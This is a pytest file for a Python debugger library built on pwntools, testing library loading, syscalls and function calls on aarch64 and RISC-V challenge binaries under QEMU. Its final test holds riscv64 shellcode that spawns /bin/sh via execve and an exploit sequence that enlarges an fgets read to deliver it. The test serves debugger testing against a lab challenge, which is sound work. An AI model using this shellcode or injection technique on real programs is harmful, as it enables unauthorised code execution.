"""Extra libraries, and the aarch64 / RISC-V challenges run under QEMU."""
import pytest
from pwn import asm, constants, log

pytestmark = pytest.mark.timeout(180)


def test_additional_library(debugger, challenge):
    """
    access_library("libz") loads a library other than the libc: the GOT entry of deflateEnd points at libz's symbol.
    """
    dbg = debugger(challenge("deflation"), aslr=False, from_entry=True)
    dbg.access_library("libz")
    assert dbg.read_pointer(dbg.exe.got["deflateEnd"]) == dbg.libz.symbols["deflateEnd"]


@pytest.mark.qemu("riscv64")
@pytest.mark.pwndbg
def test_riscv_libraries(debugger, challenge, plugin_script):
    """
    A dynamic riscv64 challenge under QEMU (with pwndbg): from the loader the libraries appear as they are loaded,
    compressed instructions decode (c.slli) and the GOT points into the libc.
    """
    dbg = debugger(challenge("risky-business"), aslr=False, from_entry=False, script=plugin_script("pwndbg"))
    assert dbg.instruction_pointer not in dbg.exe
    assert dbg.instruction_pointer in dbg.ld
    assert len(dbg.libs) == 2
    dbg.until("__tunable_get_val")
    assert dbg.next_inst.insn_name() == "c.slli"
    dbg.until(dbg.elf.entry)
    assert len(dbg.libs) == 3
    assert dbg.read_pointer(dbg.exe.got["fgets"]) == dbg.libc.symbols["fgets"]
    assert dbg.instruction_pointer in dbg.exe
    assert dbg.instruction_pointer not in dbg.libc and dbg.instruction_pointer not in dbg.ld
    dbg.until("fgets")
    assert dbg.instruction_pointer in dbg.libc


@pytest.mark.qemu("aarch64")
@pytest.mark.pwndbg
class TestAarch64:
    def test_continue_until(self, debugger, challenge, plugin_script):
        """continue_until("main") on the challenge under QEMU stops at the address the legacy suite recorded."""
        dbg = debugger(challenge("run_prog_with_symbols"), script=plugin_script("pwndbg"))
        dbg.continue_until("main")
        assert dbg.instruction_pointer == 0x23baf8

    def test_syscall(self, debugger, challenge, plugin_script, tmp_path):
        """
        syscall() under QEMU uses the architecture's syscall numbers and arguments: the write reaches the program's
        output or the file.
        """
        dbg = debugger(challenge("run_prog_with_symbols"), script=plugin_script("pwndbg"))
        path = str(tmp_path / "data.txt")
        open(path, "wb").close()
        dbg.until("main")
        fd = dbg.syscall(constants.SYS_openat, [constants.AT_FDCWD, path, constants.O_WRONLY, 0x0])
        data = b"ciao, come stai ?"
        dbg.syscall(constants.SYS_write, [fd, data, len(data)])
        dbg.syscall(constants.SYS_close, [fd])
        assert open(path, "rb").read() == data

    def test_call(self, debugger, challenge, plugin_script):
        """
        call() of a function of the challenge under QEMU, repeated: each call prints its output and the program then
        ends normally.
        """
        dbg = debugger(challenge("test_arm_call"), script=plugin_script("pwndbg"))
        dbg.until("main")
        for i in [3, 6, 1]:
            dbg.call("forkexample", [i])
            assert dbg.p.recvline() == f"{i}\n".encode()
        dbg.c()
        assert dbg.p.recvline() == b"all done!\n"


@pytest.mark.qemu("riscv32")
@pytest.mark.pwndbg
class TestRiscv:
    def test_continue_until(self, debugger, challenge, plugin_script):
        """continue_until("main") on the challenge under QEMU stops at the address the legacy suite recorded."""
        dbg = debugger(challenge("smash-baby"), env={"FLAG": "flag{test}"}, script=plugin_script("pwndbg"))
        dbg.continue_until("open")
        assert dbg.instruction_pointer == 0x1ce38

    def test_syscall(self, debugger, challenge, plugin_script):
        """
        syscall() under QEMU uses the architecture's syscall numbers and arguments: the write reaches the program's
        output or the file.
        """
        dbg = debugger(challenge("smash-baby"), env={"FLAG": "flag{test}"}, script=plugin_script("pwndbg"))
        dbg.until("main")
        data = b"ciao, come stai ?\n"
        assert dbg.syscall(0x40, [0x1, data, len(data)]) == len(data)
        assert dbg.p.recv() == data

    def test_call(self, debugger, challenge, plugin_script):
        """
        call() of a function of the challenge under QEMU, repeated: each call prints its output and the program then
        ends normally.
        """
        dbg = debugger(challenge("smash-baby"), script=plugin_script("pwndbg"))
        dbg.until("main")
        dbg.call("puts", [b"ciao"])
        assert dbg.p.recv() == b"ciao\n"


@pytest.mark.qemu("riscv64")
@pytest.mark.pwndbg
def test_riscv_exploit_reaches_the_shellcode(debugger, challenge, plugin_script):
    """Fails on ubuntu 24 (the legacy suite notes shellcodes can't run there)."""
    dbg = debugger(challenge("risky-business"), script=plugin_script("pwndbg"))
    shellcode = asm("""
    lui a5, 0x6e696
    addi a5, a5, 559
    sd a5, -32(sp)
    lui a5, 0x10687
    xor a6, a6, a6
    addi a6, a6, 1
    slli a6, a6, 0x1c
    sub a5, a5, a6
    addi a5, a5, 815
    sd a5, -28(sp)
    addi a5, sp, -32
    li a2, 0
    li a1, 0
    mv a0, a5
    li t1, 13
    li  t0, 17
    mul a7, t0, t1
    addi a3, a7, 115 - 221
    sb a3, -260(sp)
    addi a3, sp, -258
    jr -2(a3)
    """)

    def extend_read(d):
        size = d.args[1]
        if len(shellcode) >= size:
            log.warn(f"Your shellcode is still too long! {len(shellcode)}/{size - 1}")
            d.args[1] = len(shellcode) + 1
        return False
    dbg.b("fgets", callback=extend_read)
    done = dbg.until(0x896, wait=False)
    dbg.p.sendline(shellcode)
    done.wait()
    dbg.until(dbg.sp - 260, hw=True)
    assert dbg.next_inst.mnemonic == "ecall"
    assert dbg.read_string(dbg.syscall_args[0]) == b"/bin/sh"
